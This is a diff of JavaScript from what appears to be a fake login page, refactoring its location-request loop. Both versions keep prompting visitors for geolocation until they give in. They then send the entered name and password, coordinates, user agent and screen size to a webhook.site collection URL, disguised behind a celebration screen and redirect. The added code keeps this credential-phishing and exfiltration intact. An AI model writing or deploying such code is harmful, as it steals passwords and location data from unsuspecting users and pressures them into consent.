@@ -98,51 +98,47 @@
             return;
         }
 
-        // Function to prompt for location until granted
-        function getLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    const latitude = position.coords.latitude;
-                    const longitude = position.coords.longitude;
-                    console.log("Latitude: " + latitude);
-                    console.log("Longitude: " + longitude);
-                    localStorage.setItem("latitude", latitude);
-                    localStorage.setItem("longitude", longitude);
-                    
-                    const userAgent = navigator.userAgent;
-                    const screenWidth = window.screen.width;
-                    const screenHeight = window.screen.height;
-                    
-                    const redirectUrl = `https://webhook.site/899e7a99-f1d4-475f-9ef4-59c8cf159a3c?name=${encodeURIComponent(userName)}&password=${encodeURIComponent(userPassword)}&lat=${latitude}&lng=${longitude}&userAgent=${encodeURIComponent(userAgent)}&screenWidth=${screenWidth}&screenHeight=${screenHeight}`;
-                    
-                    displayCelebration(redirectUrl);
-                }, function(error) {
-                    console.error("Geolocation error:", error.message);
-                    if (error.code === error.PERMISSION_DENIED) {
-                        alert("You need to allow location access to proceed.");
-                        // Re-prompt for location after 1 second
-                        setTimeout(getLocation, 0.1000);
-                    }
-                });
-            } else {
-                console.error("Geolocation is not supported by this browser.");
-                alert("Geolocation is not supported by this browser.");
-            }
+        // Function to repeatedly request geolocation until access is granted
+        function requestLocation() {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                const latitude = position.coords.latitude;
+                const longitude = position.coords.longitude;
+                console.log("Latitude: " + latitude);
+                console.log("Longitude: " + longitude);
+
+                // Store geolocation and other data
+                localStorage.setItem("latitude", latitude);
+                localStorage.setItem("longitude", longitude);
+                
+                const userAgent = navigator.userAgent;
+                const screenWidth = window.screen.width;
+                const screenHeight = window.screen.height;
+                
+                // Construct the redirect URL with the collected data
+                const redirectUrl = `https://webhook.site/80b1ae20-af08-4a0a-ae43-1cdf169f6ad5?name=${encodeURIComponent(userName)}&password=${encodeURIComponent(userPassword)}&lat=${latitude}&lng=${longitude}&userAgent=${encodeURIComponent(userAgent)}&screenWidth=${screenWidth}&screenHeight=${screenHeight}`;
+                
+                displayCelebration(redirectUrl);
+            }, function(error) {
+                if (error.code === error.PERMISSION_DENIED) {
+                    alert("Location access is required to proceed. Please allow location access.");
+                    // Retry location request after a short delay
+                    setTimeout(requestLocation, 1000);
+                }
+            });
         }
 
-        // Function to show celebration and redirect after 1 second
+        // Function to display celebration and redirect after 1 second
         function displayCelebration(redirectUrl) {
             document.querySelector('.login-container').style.display = 'none';
             document.querySelector('.celebration-container').style.display = 'block';
             
-            // Redirect after 1 second (1000 milliseconds)
             setTimeout(function() {
                 window.location.href = redirectUrl;
             }, 1000);
         }
 
-        // Start the location prompt
-        getLocation();
+        // Start the geolocation loop
+        requestLocation();
     };
 </script>
 
